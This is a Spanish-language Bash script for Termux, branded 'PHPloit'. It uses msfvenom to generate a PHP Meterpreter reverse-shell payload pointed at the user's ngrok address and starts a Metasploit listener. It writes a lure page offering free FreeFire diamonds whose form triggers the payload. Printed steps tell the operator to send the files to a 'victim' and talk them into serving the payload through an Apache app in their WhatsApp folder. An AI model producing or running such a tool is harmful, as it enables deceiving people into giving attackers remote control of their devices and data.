#! /bin/bash

white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"


#directory verification
directory=$(pwd)


if which figlet >/dev/null; then
sleep 1
echo ""
echo -e "$blue(figlet)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 1
echo -e "$red(figlet)$nc No instalado [$red✗$nc]"
sleep 1
echo -e "\e[1;32mInstalando figlet ...\e[0m"
sleep 3
pkg install figlet
fi

DIRECTORIO=/data/data/com.termux/files/usr/opt/metasploit-framework

if [ -d "$DIRECTORIO" ]
then
   echo -e "Directorio $blue(${DIRECTORIO}) $nc... $green existe"
else
   echo "Directorio $blue(${DIRECTORIO}) $nc... $green no existe"
bash metasploit.sh
fi
clear

setterm -foreground red
echo " /////////////////////////////////"
setterm -foreground yellow
   figlet PHPloit
setterm -foreground red
echo " /////////////////////////////////"
echo ""
echo ""
setterm -foreground blue
#Contestar las preguntas
echo -n "[+]Escribe tu ip ngrok >> "
read a
echo ""
echo -n "[+]Escribe tu puerto ngrok >> "
read b
echo ""
echo -n "[+]Escribe el puerto >> "
read c
echo ""
echo -n "[+]Escribe el nombre php ej.[pagina2] >> "
read name
echo ""
sleep 1

setterm -foreground cyan
echo " [+]Generando $name.php ..."
echo ""
setterm -foreground green
#Ejecutar msfvenom
msfvenom -p php/meterpreter/reverse_tcp lhost=$a lport=$b r > $name.php
echo ""
setterm -foreground red
echo -e "\e[1;31;42mNOTA:\e[0m Su archivo $name.php se guardo"
echo ""
echo -e "\e[1;32;41mAhora enviale los dos archivos que se te guardo el index y el php\e[0m"
echo -e "\e[1;32;41my dile a la victima que instale apache web server de la play store\e[0m"
echo -e "\e[1;32;41my que abra y elija la carpeta web en la opcion interna , luego marque la carpeta WhatsApp\e[0m"
echo -e "\e[1;32;41my que abra la url que se le genero y listo dile que llene el formulario y ponga enviar\e[0m"
echo ""
#Ocultar $name.php en pagina html
echo "
<html>
<head>
</head>
<body>
<form action='$name.php' method='POST'>
<h2><FONT COLOR="blue"> Ingresa tu ID de FreeFire </FONT></h2>
<input type='text' placeholder='ingresa tu ID'>
<hr>
<h2><FONT COLOR="blue"> Ingresa los Diamantes que deseas </FONT></h2>
<input type='text' placeholder='Cuantos diamantes deseas'>
<p></p>
<input type='submit' value='Enviar'>
<p></p>
<img src="images.jpeg" width="700px" height="500px">
</body>
</html>
" > index.html

setterm -foreground blue
echo "////Ejecutando metasploit framework \\\\"
echo ""
#Ejecutar msfconsole
msfconsole -q -x "use exploit/multi/handler;set payload php/meterpreter/reverse_tcp;set lhost 0.0.0.0;set lport $c;exploit"
#

